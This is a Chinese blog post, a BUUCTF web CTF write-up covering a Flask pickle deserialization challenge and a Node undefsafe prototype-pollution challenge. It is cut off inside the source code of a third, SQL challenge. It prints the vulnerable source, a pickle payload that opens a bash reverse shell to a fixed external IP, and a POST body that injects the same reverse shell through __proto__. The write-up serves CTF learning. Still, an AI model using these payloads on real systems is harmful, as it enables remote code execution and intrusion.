<!DOCTYPE html>
<html lang="zh-CN">
    <head prefix="og: https://ogp.me/ns#">
  <meta charset="utf-8">
  <meta name="referrer" content="no-referrer" />
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="color-scheme" content="light dark">
  
  <title>BUUCTF Web Writeup 6 - Boogiepop Doesn&#39;t Laugh</title>
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    <link rel='manifest' href='/manifest.json'>
  

  
  
  
  <meta property="og:title" content="BUUCTF Web Writeup 6 - Boogiepop Doesn&#39;t Laugh" />
  
  <meta property="og:type" content="article" />
  
  <meta property="og:url" content="http://boogipop.com/2023/07/02/BUUCTF%20Web%20WriteUp%206/index.html" />
  
  <meta property="og:image" content="/favicon.png" />
  
  <meta property="og:article:published_time" content="2023-07-02T08:33:28.000Z" />
  
  <meta property="og:article:author" content="Boogipop" />
  
  

  
<link rel="stylesheet" href="/css/var.css">

  
<link rel="stylesheet" href="/css/main.css">

  
<link rel="stylesheet" href="/css/typography.css">

  
<link rel="stylesheet" href="/css/code-highlighting.css">

  
<link rel="stylesheet" href="/css/components.css">

  
<link rel="stylesheet" href="/css/nav.css">

  
<link rel="stylesheet" href="/css/paginator.css">

  
<link rel="stylesheet" href="/css/footer.css">

  
<link rel="stylesheet" href="/css/post-list.css">

  
<link rel="stylesheet" href="/css/giscus.css">

  
  
<link rel="stylesheet" href="/css/rainbow-banner.css">

  
  
  
<link rel="stylesheet" href="/css/toc.css">

  
  
    
<link rel="stylesheet" href="/css/giscus.css">

  
  
  
  
<link rel="stylesheet" href="/css/post.css">

  
  
  
  
  

  
<meta name="generator" content="Hexo 6.3.0"></head>
    <body
        data-color-scheme="auto"
        data-uppercase-categories="true"
        
        data-rainbow-banner="true"
        data-rainbow-banner-shown="auto"
        data-rainbow-banner-month="6"
        data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
        
        data-config-root="/"
        
        data-toc="true"
        data-toc-max-depth="2"
        
        
    >
        <nav id="theme-nav">
    <div class="inner">
        <a class="title" href="/">Blog</a>
        <div class="nav-arrow"></div>
        <div class="nav-items">
            <a class="nav-item nav-item-home" href="/">Home</a>
            
            
            <a class="nav-item" href="/archives">Archives</a>
            
            
            
            <a class="nav-item" href="/friends">Friends</a>
            
            
            
            <a class="nav-item" href="/about">About</a>
            
            
            
            <a class="nav-item" href="/categories">Categories</a>
            
            
            
            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/MrWillCom" target="_blank" aria-label="GitHub">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-codepen nav-item-icon" href="https://codepen.io/mrwillcom" target="_blank" aria-label="CodePen">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-patreon nav-item-icon" href="https://www.patreon.com/MrWillCom" target="_blank" aria-label="Patreon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-mastodon nav-item-icon" href="https://noc.social/@MrWillCom" target="_blank" aria-label="Mastodon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-discord nav-item-icon" href="https://discord.gg/UKuFDjcfY8" target="_blank" aria-label="Discord">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-search nav-item-icon" href="/search" target="_blank" aria-label="Search">&nbsp;</a>
            
            
        </div>
    </div>
</nav>
        
<article class="post">
    <div class="meta">
        
        <div class="categories text-uppercase">
        
            <a href="/categories/In-Challenge/">In Challenge</a>
        
        </div>
        

        
        <div class="date" id="date">
            <span>July</span>
            <span>2,</span>
            <span>2023</span>
        </div>
        

        <h2 class="title">BUUCTF Web Writeup 6</h2>
    </div>

    <div class="divider"></div>

    <div class="content">
        <p>征战第六大陆，开始乱序做题</p>
<h1 id="HFCTF-2021-Final-easyflask"><a href="#HFCTF-2021-Final-easyflask" class="headerlink" title="[HFCTF 2021 Final]easyflask"></a>[HFCTF 2021 Final]easyflask</h1><p>考点：简单pickle反序列化</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/python3.6</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, session</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&quot;SECRET_KEY&quot;</span>] = <span class="string">&quot;*******&quot;</span></span><br><span class="line"></span><br><span class="line">    User = <span class="built_in">type</span>(<span class="string">&#x27;User&#x27;</span>, (<span class="built_in">object</span>,), &#123;</span><br><span class="line">    <span class="string">&#x27;uname&#x27;</span>: <span class="string">&#x27;test&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;is_admin&#x27;</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="string">&#x27;__repr__&#x27;</span>: <span class="keyword">lambda</span> o: o.uname,</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=(<span class="params"><span class="string">&#x27;GET&#x27;</span>,</span>)</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index_handler</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> session.get(<span class="string">&#x27;u&#x27;</span>):</span><br><span class="line">        u = pickle.dumps(User())</span><br><span class="line">        session[<span class="string">&#x27;u&#x27;</span>] = u</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;/file?file=index.js&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/file&#x27;</span>, methods=(<span class="params"><span class="string">&#x27;GET&#x27;</span>,</span>)</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">file_handler</span>():</span><br><span class="line">    path = request.args.get(<span class="string">&#x27;file&#x27;</span>)</span><br><span class="line">    path = os.path.join(<span class="string">&#x27;static&#x27;</span>, path)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(path) <span class="keyword">or</span> os.path.isdir(path) \</span><br><span class="line">            <span class="keyword">or</span> <span class="string">&#x27;.py&#x27;</span> <span class="keyword">in</span> path <span class="keyword">or</span> <span class="string">&#x27;.sh&#x27;</span> <span class="keyword">in</span> path <span class="keyword">or</span> <span class="string">&#x27;..&#x27;</span> <span class="keyword">in</span> path <span class="keyword">or</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> path:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;disallowed&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">        content = fp.read()</span><br><span class="line">    <span class="keyword">return</span> content</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/admin&#x27;</span>, methods=(<span class="params"><span class="string">&#x27;GET&#x27;</span>,</span>)</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">admin_handler</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        u = session.get(<span class="string">&#x27;u&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(u, <span class="built_in">dict</span>):</span><br><span class="line">            u = b64decode(u.get(<span class="string">&#x27;b&#x27;</span>))</span><br><span class="line">        u = pickle.loads(u)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;uhh?&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> u.is_admin == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;welcome, admin&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;who are you?&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>, debug=<span class="literal">False</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>构造pickle访问&#x2F;amdin就会触发</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">newp=<span class="string">b&#x27;&#x27;&#x27;cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">(S&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/114.116.119.253/7777 &lt;&amp;1&quot;&#x27;</span></span><br><span class="line"><span class="string">tR.&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(newp)</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(newp))</span><br></pre></td></tr></table></figure>
<p>把生成的base64替换到session中就好，secretkey在environ里面<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1681743037455-b66ed553-f7fb-4263-8fa8-e93e5cd33ce2.png#averageHue=%23e8e5e3&clientId=u04f7eb57-a4ef-4&from=paste&height=131&id=u37851df8&originHeight=164&originWidth=1672&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=32789&status=done&style=none&taskId=u2af3e0ca-bf69-4982-9566-f2595bde87c&title=&width=1337.6" alt="image.png"></p>
<h1 id="网鼎杯-2020-青龙组-notes"><a href="#网鼎杯-2020-青龙组-notes" class="headerlink" title="[网鼎杯 2020 青龙组]notes"></a>[网鼎杯 2020 青龙组]notes</h1><p>考点：undefsafe模块原型链污染</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> undefsafe = <span class="built_in">require</span>(<span class="string">&#x27;undefsafe&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; exec &#125; = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Notes</span> &#123;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">owner</span> = <span class="string">&quot;whoknows&quot;</span>;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">num</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">note_list</span> = &#123;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">write_note</span>(<span class="params">author, raw_note</span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">note_list</span>[(<span class="variable language_">this</span>.<span class="property">num</span>++).<span class="title function_">toString</span>()] = &#123;<span class="string">&quot;author&quot;</span>: author,<span class="string">&quot;raw_note&quot;</span>:raw_note&#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">get_note</span>(<span class="params">id</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> r = &#123;&#125;</span><br><span class="line">        <span class="title function_">undefsafe</span>(r, id, <span class="title function_">undefsafe</span>(<span class="variable language_">this</span>.<span class="property">note_list</span>, id));</span><br><span class="line">        <span class="keyword">return</span> r;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">edit_note</span>(<span class="params">id, author, raw</span>) &#123;</span><br><span class="line">        <span class="title function_">undefsafe</span>(<span class="variable language_">this</span>.<span class="property">note_list</span>, id + <span class="string">&#x27;.author&#x27;</span>, author);</span><br><span class="line">        <span class="title function_">undefsafe</span>(<span class="variable language_">this</span>.<span class="property">note_list</span>, id + <span class="string">&#x27;.raw_note&#x27;</span>, raw);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">get_all_notes</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">note_list</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">remove_note</span>(<span class="params">id</span>) &#123;</span><br><span class="line">        <span class="keyword">delete</span> <span class="variable language_">this</span>.<span class="property">note_list</span>[id];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> notes = <span class="keyword">new</span> <span class="title class_">Notes</span>();</span><br><span class="line">notes.<span class="title function_">write_note</span>(<span class="string">&quot;nobody&quot;</span>, <span class="string">&quot;this is nobody&#x27;s first note&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;views&#x27;</span>, path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;views&#x27;</span>));</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;pug&#x27;</span>);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">json</span>());</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">urlencoded</span>(&#123; <span class="attr">extended</span>: <span class="literal">false</span> &#125;));</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">static</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;public&#x27;</span>)));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>, &#123; <span class="attr">title</span>: <span class="string">&#x27;Notebook&#x27;</span> &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">route</span>(<span class="string">&#x27;/add_note&#x27;</span>)</span><br><span class="line">    .<span class="title function_">get</span>(<span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">        res.<span class="title function_">render</span>(<span class="string">&#x27;mess&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&#x27;please use POST to add a note&#x27;</span>&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    .<span class="title function_">post</span>(<span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> author = req.<span class="property">body</span>.<span class="property">author</span>;</span><br><span class="line">        <span class="keyword">let</span> raw = req.<span class="property">body</span>.<span class="property">raw</span>;</span><br><span class="line">        <span class="keyword">if</span> (author &amp;&amp; raw) &#123;</span><br><span class="line">            notes.<span class="title function_">write_note</span>(author, raw);</span><br><span class="line">            res.<span class="title function_">render</span>(<span class="string">&#x27;mess&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;add note sucess&quot;</span>&#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.<span class="title function_">render</span>(<span class="string">&#x27;mess&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;did not add note&quot;</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">route</span>(<span class="string">&#x27;/edit_note&#x27;</span>)</span><br><span class="line">    .<span class="title function_">get</span>(<span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">        res.<span class="title function_">render</span>(<span class="string">&#x27;mess&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;please use POST to edit a note&quot;</span>&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    .<span class="title function_">post</span>(<span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> id = req.<span class="property">body</span>.<span class="property">id</span>;</span><br><span class="line">        <span class="keyword">let</span> author = req.<span class="property">body</span>.<span class="property">author</span>;</span><br><span class="line">        <span class="keyword">let</span> enote = req.<span class="property">body</span>.<span class="property">raw</span>;</span><br><span class="line">        <span class="keyword">if</span> (id &amp;&amp; author &amp;&amp; enote) &#123;</span><br><span class="line">            notes.<span class="title function_">edit_note</span>(id, author, enote);</span><br><span class="line">            res.<span class="title function_">render</span>(<span class="string">&#x27;mess&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;edit note sucess&quot;</span>&#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.<span class="title function_">render</span>(<span class="string">&#x27;mess&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;edit note failed&quot;</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">route</span>(<span class="string">&#x27;/delete_note&#x27;</span>)</span><br><span class="line">    .<span class="title function_">get</span>(<span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">        res.<span class="title function_">render</span>(<span class="string">&#x27;mess&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;please use POST to delete a note&quot;</span>&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    .<span class="title function_">post</span>(<span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> id = req.<span class="property">body</span>.<span class="property">id</span>;</span><br><span class="line">        <span class="keyword">if</span> (id) &#123;</span><br><span class="line">            notes.<span class="title function_">remove_note</span>(id);</span><br><span class="line">            res.<span class="title function_">render</span>(<span class="string">&#x27;mess&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;delete done&quot;</span>&#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.<span class="title function_">render</span>(<span class="string">&#x27;mess&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;delete failed&quot;</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">route</span>(<span class="string">&#x27;/notes&#x27;</span>)</span><br><span class="line">    .<span class="title function_">get</span>(<span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> q = req.<span class="property">query</span>.<span class="property">q</span>;</span><br><span class="line">        <span class="keyword">let</span> a_note;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_">typeof</span>(q) === <span class="string">&quot;undefined&quot;</span>) &#123;</span><br><span class="line">            a_note = notes.<span class="title function_">get_all_notes</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;	</span><br><span class="line">            a_note = notes.<span class="title function_">get_note</span>(q);</span><br><span class="line">        &#125;</span><br><span class="line">        res.<span class="title function_">render</span>(<span class="string">&#x27;note&#x27;</span>, &#123;<span class="attr">list</span>: a_note&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">route</span>(<span class="string">&#x27;/status&#x27;</span>)</span><br><span class="line">    .<span class="title function_">get</span>(<span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> commands = &#123;</span><br><span class="line">            <span class="string">&quot;script-1&quot;</span>: <span class="string">&quot;uptime&quot;</span>,</span><br><span class="line">            <span class="string">&quot;script-2&quot;</span>: <span class="string">&quot;free -m&quot;</span></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> index <span class="keyword">in</span> commands) &#123;</span><br><span class="line">            <span class="title function_">exec</span>(commands[index], &#123;<span class="attr">shell</span>:<span class="string">&#x27;/bin/bash&#x27;</span>&#125;, <span class="function">(<span class="params">err, stdout, stderr</span>) =&gt;</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (err) &#123;</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`stdout: <span class="subst">$&#123;stdout&#125;</span>`</span>);</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&#x27;OK&#x27;</span>);</span><br><span class="line">        res.<span class="title function_">end</span>();</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">status</span>(<span class="number">404</span>).<span class="title function_">send</span>(<span class="string">&#x27;Sorry cant find that!&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="keyword">function</span>(<span class="params">err, req, res, next</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">error</span>(err.<span class="property">stack</span>);</span><br><span class="line">  res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&#x27;Something broke!&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> port = <span class="number">8080</span>;</span><br><span class="line">app.<span class="title function_">listen</span>(port, <span class="function">() =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Example app listening at http://localhost:<span class="subst">$&#123;port&#125;</span>`</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>仔细审一下也就是知道是用undefsafe模块原型链污染，给commands对象加一个恶意的键值对，而我们的undefsafe模块就可以做到这一点：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1681745205545-a4154fde-50c6-485d-af75-31ea8f6ba2a1.png#averageHue=%23272825&clientId=uba85e8a1-7d0d-4&from=paste&height=734&id=u2b06f281&originHeight=918&originWidth=1774&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=2403495&status=done&style=none&taskId=ud8c69131-2514-4a61-acbe-13f07b2a403&title=&width=1419.2" alt="image.png"><br>如上图所示我们成功的通过原型链污染给commands对象添加了一个键值对<code>&#123;&quot;a&quot;:1&#125;</code>，那我们只需要细细的发包即可污染<br>add_note:<br><code>author=boogipop&amp;raw=fuck</code><br>edit_note:<br><code>id=__proto__&amp;author=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F114.116.119.253%2F7777%20%3C%261%22&amp;raw=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F114.116.119.253%2F7777%20%3C%261%22</code><br>最后访问status去触发rce<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1681745278920-465fe6b8-3f5a-48eb-9f96-179507808ece.png#averageHue=%232e2d2d&clientId=uba85e8a1-7d0d-4&from=paste&height=137&id=uacf212c1&originHeight=171&originWidth=706&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=9750&status=done&style=none&taskId=ub9abf057-625e-408f-a8ba-8ef89b3ad50&title=&width=564.8" alt="image.png"></p>
<h1 id="PwnThyBytes-2019-Baby-SQL"><a href="#PwnThyBytes-2019-Baby-SQL" class="headerlink" title="[PwnThyBytes 2019]Baby_SQL"></a>[PwnThyBytes 2019]Baby_SQL</h1><p>考点：session_upload_progress绕过登录验证，SQL注入</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span 